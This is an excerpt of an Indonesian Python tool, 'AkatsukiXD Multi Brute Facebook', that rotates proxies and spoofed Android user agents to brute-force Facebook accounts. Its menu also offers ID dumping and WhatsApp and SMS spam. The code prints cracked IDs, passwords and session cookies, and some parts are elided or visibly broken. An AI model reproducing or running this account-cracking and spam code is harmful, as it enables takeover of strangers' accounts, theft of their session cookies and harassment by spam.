# [+] Update By AkatsukiXD And All
# [+] Script Premium Jangan Di Record Ya
# [+] Donasi Untuk AkatsukiXD 
# [+] Dana : 0895414128194
...
sys.stdout.write('\x1b]2; BMBF | AkatsukiXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari AkatsukiXD');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-M205F Build/QP1A)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131'
	...
	g='Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
...
for x in range(10):
	...
	uak=f'Mozilla/5.0 (Linux; Android 10 {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold red]t\█████░█████░
t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t█░░░░░█░░░░█
t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t█░░░░░█░░░░█
t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t█████░█████░
t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t█░░░░░█░░░░█        AUTHOR : AKATSUKI-CYB3R
t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t█░░░░░█░░░░█             VERSION 3.4
t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t█░░░░░█████░  f"""[bold white]                                                                                        
             """,width=90,padding=(0,8),title=f"Selamat Malam",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python AkatsukiFB.py");followdong()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , AkatsukiXD",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	...
	_____akatsuki___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____akatsuki___xd____ in ['1','01']:
		akatsuki_dump()
	elif _____akatsuki___xd____ in ['2','02']:
		dump_massal()
	elif _____akatsuki___xd____ in ['3','03']:
		crack_group()
	elif _____akatsuki___xd____ in ['4','04']:
		crack_email()
	elif _____akatsuki___xd____ in ['5','05']:
		crack_file()
	elif _____akatsuki___xd____ in ['6','06']:
		crack_nama()
	elif _____akatsuki___xd____ in ['7','07']:
		pengikut()
	elif _____akatsuki___xd____ in ['8','08']:
		komen()
	elif _____akatsuki___xd____ in ['9','09']:
		file_cp()
	elif _____akatsuki___xd____ in ['10']:
		result()
	elif _____akatsuki___xd____ in ['11']:
		siu()
	elif _____akatsuki___xd____ in ['12']:
		spam_wa()
	elif _____akatsuki___xd____ in ['13']:
		spam_sms()
	elif _____akatsuki___xd____ in ['14']:
		dumpid()
	elif _____akatsuki___xd____ in ['15']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='AkatsukiXD-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='AkatsukiXD-OK')
					cetak(statusok1)
...
def scarpping_ua():
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            uascrap.append("Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36")
